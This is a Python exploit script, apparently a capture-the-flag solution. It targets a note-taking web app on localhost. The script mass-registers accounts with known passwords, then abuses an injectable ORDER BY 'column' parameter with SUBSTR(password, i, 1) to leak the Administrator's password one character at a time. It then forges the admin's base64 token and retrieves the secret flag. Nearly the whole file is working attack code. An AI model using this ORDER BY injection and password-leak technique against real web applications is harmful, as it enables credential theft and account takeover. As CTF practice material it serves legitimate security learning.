import requests
import random
import string
import base64
import json

# Retry until it works

PW_LENGTH = 32
PW_CHARSET = string.ascii_lowercase
CHAL_SERVER = 'http://localhost:28023'
users = {}
for c in PW_CHARSET:
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
    users[c + "".join(random.choices(list(string.digits),k=10))] = c * PW_LENGTH
def signup(username,password):
    res = requests.post(CHAL_SERVER + '/signup',headers={'Content-Type':'application/json'},json={'username':username,'password':password})

def getNote(column,token,ascending='ASC'):
    res = requests.get(CHAL_SERVER + f'/note?noteType=public&column={column}&ascending={ascending}',cookies={'token':token})
    return res.json()['content']

def getFlag(token):
    res = requests.get(CHAL_SERVER + f'/note?noteType=secret',cookies={'token':token})
    return res.json()['content']

def solve(content,users):
    l_users = list(users.keys())
    t_idx = content.index('Administrator')
    table = {}
    m = {}
    for i, v in enumerate(string.ascii_lowercase):
        m[v] = i
    for i, user in enumerate(l_users):
        if m[user[0]] in table.keys():
            table[m[user[0]]].append(content.index(user))
        else:
            table[m[user[0]]] = [content.index(user)]
    for k,v in table.items():
        if t_idx in range(min(v),max(v)):
            return PW_CHARSET[k]    
    print("Out of range!")
    import sys
    sys.exit(1)

for u,p in users.items():
    signup(u,p)
out = {}
out2 = {}
signup('test','password')
for i in range(PW_LENGTH):
    temp = getNote(f'SUBSTR(password, {i+1}, 1)',base64.b64encode(f'test:password'.encode()).decode())
    temp2 = []
    for j in temp:
        temp2.append(j['username'])
    out[i] = temp2

pw = ""
for i in range(PW_LENGTH):
    pw += solve(out[i],users)

flag = getFlag(base64.b64encode(f'Administrator:{pw}'.encode()).decode())
print(flag)